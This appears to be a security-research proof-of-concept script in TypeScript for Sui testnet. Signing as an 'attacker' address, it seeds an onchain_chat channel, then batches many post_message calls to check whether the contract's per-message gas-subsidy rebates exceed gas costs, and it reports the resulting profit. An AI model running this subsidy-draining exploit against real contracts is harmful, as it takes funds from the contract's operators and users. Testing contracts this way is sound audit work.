// Marginal-only burst: pure post_message K, minimal preview/event bytes.
// Storage is the dominant cost; check per-message marginal gas precisely.
import { SuiGrpcClient } from "@mysten/sui/grpc"
import { Ed25519Keypair } from "@mysten/sui/keypairs/ed25519"
import { fromBase64 } from "@mysten/sui/utils"
import { Transaction } from "@mysten/sui/transactions"
import { readFileSync } from "node:fs"
import { homedir } from "node:os"

const PKG = "0xcdc87b8ef5b071a293966f4329f1e9b4a443f49f1cf599cc188009cf7524ab44"
const CLOCK = "0x0000000000000000000000000000000000000000000000000000000000000006"
const ATTACKER = "0x843f44a42e10a6dc701b7f60a4dedc544dc7910e971ee6a493f4d9096953e04e"
const client = new SuiGrpcClient({ network: "testnet", baseUrl: "https://fullnode.testnet.sui.io:443" } as any)
const ks = JSON.parse(readFileSync(`${homedir()}/.sui/sui_config/sui.keystore`, "utf8")) as string[]
let att: Ed25519Keypair | undefined
for (const e of ks) { const kp = Ed25519Keypair.fromSecretKey(fromBase64(e).slice(1)); if (kp.toSuiAddress() === ATTACKER) att = kp }
if (!att) throw new Error("no attacker key")
const st = JSON.parse(readFileSync("/tmp/t01-state.json", "utf8"))
const chan2 = st.chan2

// seed small
{
  const t0 = new Transaction()
  const [c] = t0.splitCoins(t0.gas, [t0.pure.u64(20_000_000n)]) as any[]
  t0.moveCall({ target: `${PKG}::onchain_chat::deposit_staking_yield`, arguments: [t0.object(chan2), c] })
  t0.setGasBudget(15_000_000); t0.setSender(att.toSuiAddress())
  const bytes = await t0.build({ client } as any)
  const sig = await att.signTransaction(bytes)
  await client.executeTransaction({ transaction: bytes, signatures: [sig.signature] })
  console.log("seeded 0.02")
}
await new Promise((r) => setTimeout(r, 6000))
for (const K of [5, 10]) {
  const tx = new Transaction()
  for (let i = 0; i < K; i++) {
    tx.moveCall({
      target: `${PKG}::onchain_chat::post_message`,
      arguments: [tx.object(chan2), tx.object(CLOCK), tx.pure.vector("u8", Buffer.from("b")), tx.pure.vector("u8", Buffer.from("x"))],
    })
  }
  tx.setGasBudget(40_000_000); tx.setSender(att.toSuiAddress())
  const bytes = await tx.build({ client } as any)
  const sig = await att.signTransaction(bytes)
  const res: any = await client.executeTransaction({ transaction: bytes, signatures: [sig.signature], include: { effects: true, events: true } })
  const t = res.Transaction
  const evs = Array.isArray(t?.events) ? t.events : (t?.events?.events ?? [])
  const rebates = evs.filter((e: any) => String(e.eventType ?? e.type).endsWith("GasSubsidizedEvent")).length
  const g = t?.effects?.gasUsed ?? {}
  const net = BigInt(g.computationCost ?? 0) + BigInt(g.storageCost ?? 0) - BigInt(g.storageRebate ?? 0)
  const profit = BigInt(rebates * 1_000_000) - net
  console.log(`K=${K} rebates=${rebates} netGas=${net} profit=${profit} MIST (${(Number(profit) / 1e9).toFixed(6)} SUI) digest=${typeof t?.digest === "string" ? t.digest : t?.digest?.digest}`)
  await new Promise((r) => setTimeout(r, 3000))
}
